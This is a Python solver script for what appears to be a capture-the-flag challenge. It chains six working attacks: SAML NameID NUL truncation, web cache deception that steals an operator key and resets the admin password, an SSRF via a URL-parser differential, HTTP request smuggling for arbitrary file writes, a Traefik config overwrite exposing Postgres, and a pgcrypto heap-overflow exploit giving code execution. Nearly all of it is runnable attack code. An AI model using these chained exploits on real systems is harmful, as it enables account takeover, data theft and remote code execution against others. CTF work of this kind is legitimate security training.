#!/usr/bin/env python3
"""
Vaultrune / ca_insane - full chain exploit (Stages 1-6)

  S1  SAML federation differential -> CLERK (not admin).
      The Signet IdP is a real SimpleSAMLphp: PHP validates and stores the FULL
      bytes of a username, but libxml2 truncates the <NameID> at the first 0x00
      when it serialises the assertion, and the assertion is signed AFTER
      truncation. Register `warrant-clerk@vaultrune.valyssar.local` + 0x00 + 'x'
      (byte-distinct, so it slips past the local-domain signup block), log in as
      that NUL account; the IdP signs an assertion whose NameID libxml2 has
      truncated to a clean `...@vaultrune.valyssar.local`. The SP maps any
      local-domain NameID to CLERK. There is no SAML path to admin.
  S2  Web Cache Deception against the Warden's proctor -> ADMIN.
      As a clerk, file a "static-looking" reference into the review queue:
        /static/<rand>.css/..%2f..%2fadmin/account
      The Warden's proctor (authenticated) fetches it through the public edge.
      Varnish caches on the LITERAL path; nginx decodes %2f + collapses ".." and
      resolves it to /admin/account, returning the operator's sealing key to the
      bot's cookie. Varnish caches that authenticated 200 under the /static key.
      The attacker reads the SAME path UNAUTHENTICATED -> cache HIT -> steals the
      sealing key, POSTs /api/account/reset-password (the key resets its OWN
      account), then logs in at /admin/login with the new password -> admin.
  S3  Courier SSRF: the admin-only courier console resolves+pins the destination
      and rejects loopback/private/reserved, but validates urlsplit().hostname
      while `requests` connects with the raw URL. A backslash-in-authority
      differential (`http://127.0.0.1:7200\\@1.1.1.1/../status`) reaches the
      loopback-only Inner Ward (oatpp).
  S4  HTTP/1 request smuggling: the courier carries a header whose NAME contains a
      space (`X -Forwarded`); oatpp drops every header after it (incl.
      Content-Length), so the parcel body is parsed as a smuggled PUT
      /records/write = arbitrary file write.
  S5  Reverse-proxy config abuse: the AFW overwrites /etc/traefik/dynamic.yml with
      a TCP catch-all; Traefik (watch:true) hot-reloads and the public port now
      carries raw TCP to internal Postgres (one-shot - kills the web app).
  S6  pgcrypto CVE-2026-2005 heap overflow: as ctf_user, resolve the PIE base via
      the allocator's MemoryContext->mcxt_methods, forge CurrentUserId = OID 10,
      then COPY ... FROM PROGRAM runs the SUID /readflag as the postgres OS user.

Usage:
    python3 solve.py --host <target-ip> --port 1337 --binary postgres.debug
"""
import argparse
import base64
import http.client
import json
import re
import secrets
import sys
import time
import urllib.parse
from html.parser import HTMLParser
from pathlib import Path

import requests

HS = "warrant-clerk@vaultrune.valyssar.local"
NUL_SUBJECT = HS + "\x00x"          # requests url-encodes the 0x00 to %00 on the wire
SIGNUP_PASSWORD = "pw1234"
OPERATOR = "warden"

PG_DYNAMIC_YML = (
    'tcp:\n'
    '  routers:\n'
    '    pg:\n'
    '      rule: "HostSNI(`*`)"\n'
    '      entryPoints: ["web"]\n'
    '      service: pg\n'
    '  services:\n'
    '    pg:\n'
    '      loadBalancer:\n'
    '        servers:\n'
    '          - address: "127.0.0.1:5432"\n'
)


def log(stage, msg):
    print(f"  [{stage}] {msg}", flush=True)


class _FormParser(HTMLParser):
    """Collect every <form> with its action/method and all <input> name=value."""

    def __init__(self):
        super().__init__()
        self.forms = []
        self._cur = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action", ""),
                         "method": (a.get("method", "get") or "get").lower(),
                         "inputs": {}}
        elif tag == "input" and self._cur is not None:
            name = a.get("name")
            if name is not None:
                self._cur["inputs"][name] = a.get("value", "")

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None


def parse_forms(html):
    p = _FormParser()
    p.feed(html)
    if p._cur is not None:          # tolerate an unclosed <form>
        p.forms.append(p._cur)
    return p.forms


def pick_login_form(html):
    """Return (inputs, action) of the SimpleSAMLphp username/password form."""
    for f in parse_forms(html):
        keys = {k.lower() for k in f["inputs"]}
        if "username" in keys or "password" in keys or "AuthState" in f["inputs"]:
            return f["inputs"], f["action"]
    forms = parse_forms(html)
    if forms:
        return forms[0]["inputs"], forms[0]["action"]
    return None, None


def raw_request(base, path, cookie=None, method="GET"):
    """Send an HTTP request with the path VERBATIM (http.client does not collapse
    ../ or decode %2f), as `curl --path-as-is` would. Returns (status, body)."""
    u = urllib.parse.urlsplit(base)
    conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=20)
    try:
        # putrequest auto-adds the Host header (host:port from the connection);
        # do NOT add a second one or the edge rejects the duplicate with 400.
        conn.putrequest(method, path, skip_accept_encoding=True)
        if cookie:
            conn.putheader("Cookie", cookie)
        conn.endheaders()
        resp = conn.getresponse()
        return resp.status, resp.read().decode("utf-8", "replace")
    finally:
        conn.close()


def decode_role(cookie):
    """Decode the registry_session payload to read its role (no signature check)."""
    try:
        value = urllib.parse.unquote(cookie.split("=", 1)[1])
        enc = value.split(".", 1)[0]
        payload = json.loads(base64.urlsafe_b64decode(enc + "=" * (-len(enc) % 4)))
        return payload.get("role")
    except Exception:
        return None


def sso_login(base, sess, username, password):
    """Sign up + SP-initiated SSO as `username`; return the registry_session cookie.
    The signup may already exist (tolerated); the credential drives the SSO login."""
    sess.post(base + "/signup",
              data={"email": username, "displayName": "Petitioner", "password": password},
              allow_redirects=True, timeout=20)

    # SP-initiated SSO: the Registry redirects to the Signet (SimpleSAMLphp).
    r0 = sess.get(base + "/login", allow_redirects=False, timeout=20)
    loc = r0.headers.get("location", "")
    if not loc:
        sys.exit("  [S1] FAIL: /login did not redirect to the Signet IdP")
    if loc.startswith("/"):
        loc = base + loc

    # Land on the Signet login form (follow SSP's internal redirects).
    page = sess.get(loc, allow_redirects=True, timeout=20)
    inputs, action = pick_login_form(page.text)
    if inputs is None:
        sys.exit("  [S1] FAIL: could not locate the Signet login form")
    action_url = urllib.parse.urljoin(page.url, action) if action else page.url

    # Authenticate (the NUL subject carries a literal 0x00 in the username).
    form = dict(inputs)
    form["username"] = username
    form["password"] = password
    r = sess.post(action_url, data=form, allow_redirects=True, timeout=20)

    # The IdP returns an auto-POST form with the signed (truncated) assertion.
    m = re.search(r'name="SAMLResponse" value="([^"]+)"', r.text)
    if not m:
        sys.exit("  [S1] FAIL: the Signet returned no signed SAMLResponse (auth failed?)")
    relay = re.search(r'name="RelayState" value="([^"]*)"', r.text)
    relay = relay.group(1) if relay else "/registry"

    r = sess.post(base + "/saml/acs",
                  data={"SAMLResponse": m.group(1), "RelayState": relay or "/registry"},
                  allow_redirects=False, timeout=20)
    cookie = (r.headers.get("set-cookie") or "").split(";")[0]
    if not cookie:
        sys.exit("  [S1] FAIL: ACS set no session cookie")
    return cookie


def stage1_clerk(base, sess):
    # Enrol the NUL-bearing subject. It is byte-distinct from the reserved
    # warrant-clerk subject and does NOT end with the local domain (the trailing
    # 0x00 x), so it slips past both UNIQUE and the local-domain signup block; the
    # IdP truncates it back to the clean local-domain NameID at sign time.
    cookie = sso_login(base, sess, NUL_SUBJECT, SIGNUP_PASSWORD)

    role = decode_role(cookie)
    if role != "clerk":
        sys.exit(f"  [S1] FAIL: expected clerk from the SAML differential, got {role!r}")

    # Negative check: the SAML identity is NOT admin and cannot reach the secret page.
    st, _ = raw_request(base, "/admin/account", cookie=cookie)
    if st != 403:
        sys.exit(f"  [S1] FAIL: /admin/account reachable as clerk (status {st}) — admin must not be federatable")
    return cookie


def steal_api_key(base, sess, clerk_cookie, attempts=8):
    """File a disguised reference, wait for the bot to review it (so the
    authenticated response is in the shared cache), then read that cache entry
    UNAUTHENTICATED and return the leaked operator sealing key (or None)."""
    for attempt in range(1, attempts + 1):
        token = secrets.token_hex(6)
        ref = f"/static/wcd-{token}.css/..%2f..%2fadmin/account"

        # File the disguised reference into the Warden review queue (clerk-only).
        sess.post(base + "/appeals", headers={"cookie": clerk_cookie},
                  data={"reference": ref}, allow_redirects=True, timeout=20)

        # Only AFTER the bot has fetched the disguise is the authenticated response in
        # the shared cache — reading earlier self-poisons the key with our own 403.
        for _ in range(20):
            time.sleep(2)
            page = sess.get(base + "/appeals", headers={"cookie": clerk_cookie}, timeout=20).text
            row = re.search(re.escape(ref) + r'[\s\S]*?data-status="(\w+)"', page)
            if row and row.group(1) == "reviewed":
                st, body = raw_request(base, ref)          # UNAUTH read of the cache
                km = re.search(r'data-api-key="([^"]+)"', body)
                if km:
                    return km.group(1)
                break
        log("S2", f"attempt {attempt}: cache not populated yet, retrying with a fresh key")
    return None


def stage2_wcd(base, sess, clerk_cookie):
    """Steal the sealing key via cache deception, reset the operator password with
    it, and log in -> admin session cookie."""
    api_key = steal_api_key(base, sess, clerk_cookie)
    if not api_key:
        sys.exit("  [S2] FAIL: could not steal the sealing key via cache deception (bot running?)")
    log("S2", f"stole the Warden sealing key via cache deception: {api_key}")

    # The sealing key resets the password of the account that OWNS it.
    newpw = secrets.token_hex(12)
    rr = requests.post(base + "/api/account/reset-password",
                       headers={"content-type": "application/json"},
                       data=json.dumps({"api_key": api_key, "new_password": newpw}),
                       timeout=20)
    if rr.status_code != 200:
        sys.exit(f"  [S2] FAIL: reset-password returned {rr.status_code}: {rr.text[:200]}")
    log("S2", "reset the sealing key via POST /api/account/reset-password")

    # Log in to the local operator console with the new password.
    lr = requests.post(base + "/admin/login",
                       data={"username": OPERATOR, "password": newpw},
                       allow_redirects=False, timeout=20)
    cookie = (lr.headers.get("set-cookie") or "").split(";")[0]
    if "registry_session" not in cookie:
        sys.exit("  [S2] FAIL: operator login set no admin session")
    if decode_role(cookie) != "admin":
        sys.exit("  [S2] FAIL: session is not admin after operator login")
    return cookie


def courier(base, cookie, address, headers=None, body=None, timeout=15):
    payload = {"address": address}
    if headers is not None:
        payload["headers"] = headers
    if body is not None:
        payload["body"] = body
    return requests.post(base + "/admin/courier",
                         headers={"cookie": cookie, "content-type": "application/json"},
                         data=json.dumps(payload), allow_redirects=False, timeout=timeout)


def inner_url(args, path):
    """Backslash-in-authority parser differential -> the loopback Inner Ward."""
    return f"http://127.0.0.1:{args.inner_port}\\@{args.decoy}/../{path}"


def smuggled_write(path, content):
    inner = json.dumps({"path": path, "data": base64.b64encode(content.encode()).decode()})
    return ("PUT /records/write HTTP/1.1\r\nHost: innerward\r\n"
            "Content-Type: application/json\r\n"
            f"Content-Length: {len(inner)}\r\n\r\n" + inner)


def load_poc():
    here = Path(__file__).resolve().parent
    if (here / "poc.py").exists():
        sys.path.insert(0, str(here))
        import poc
        return poc
    sys.exit("  [S6] FAIL: poc.py not found (expected alongside solve.py in solver/)")


def main():
    ap = argparse.ArgumentParser(description="Vaultrune / ca_insane full-chain exploit")
    ap.add_argument("--host", "-H", required=True, help="target host/IP")
    ap.add_argument("--port", "-p", type=int, default=1337, help="target port (default 1337)")
    ap.add_argument("--binary", "-b", required=True, help="symbol-bearing postgres ELF (dbgsym)")
    ap.add_argument("--decoy", default="1.1.1.1",
                    help="public decoy host for the courier SSRF parser differential")
    ap.add_argument("--inner-port", default="7200")
    ap.add_argument("--cmd", default="/readflag", help="command to run via RCE (default /readflag)")
    a = ap.parse_args()

    base = f"http://{a.host}:{a.port}"
    sess = requests.Session()

    print(f"[*] target {base}")
    clerk_cookie = stage1_clerk(base, sess)
    log("S1", "SAML NUL differential -> CLERK session (no admin from SAML)")

    admin_cookie = stage2_wcd(base, sess, clerk_cookie)
    log("S2", "web cache deception -> sealing key reset -> ADMIN session acquired")

    r = courier(base, admin_cookie, inner_url(a, "status"))
    if "crownspire-inner-ward" not in r.text:
        sys.exit("  [S3] FAIL: courier SSRF did not reach the Inner Ward")
    log("S3", "courier SSRF reached the loopback Inner Ward")

    courier(base, admin_cookie, inner_url(a, "status"),
            headers={"X -Forwarded": "x"},
            body=smuggled_write("/etc/traefik/dynamic.yml", PG_DYNAMIC_YML))
    log("S4", "smuggled PUT /records/write -> Traefik dynamic.yml overwritten")

    import psycopg2
    exposed = False
    for _ in range(60):
        time.sleep(1)
        try:
            psycopg2.connect(host=a.host, port=a.port, dbname="ctfdb", user="ctf_user",
                             password="", connect_timeout=3).close()
            exposed = True
            break
        except Exception:
            continue
    if not exposed:
        sys.exit("  [S5] FAIL: Postgres not exposed on the public port")
    log("S5", "Traefik hot-reloaded -> Postgres exposed on the public port (one-shot)")

    log("S6", "pgcrypto CVE-2026-2005 -> RCE as the postgres OS user ...")
    poc = load_poc()
    rsa = poc.generate_rsa_keypair(3072)
    conn = {"host": a.host, "port": a.port, "dbname": "ctfdb", "user": "ctf_user", "password": ""}
    print("\n========================= FLAG =========================")
    poc.run_exploit(rsa, conn, a.binary, a.cmd)
    print("========================================================")


if __name__ == "__main__":
    main()
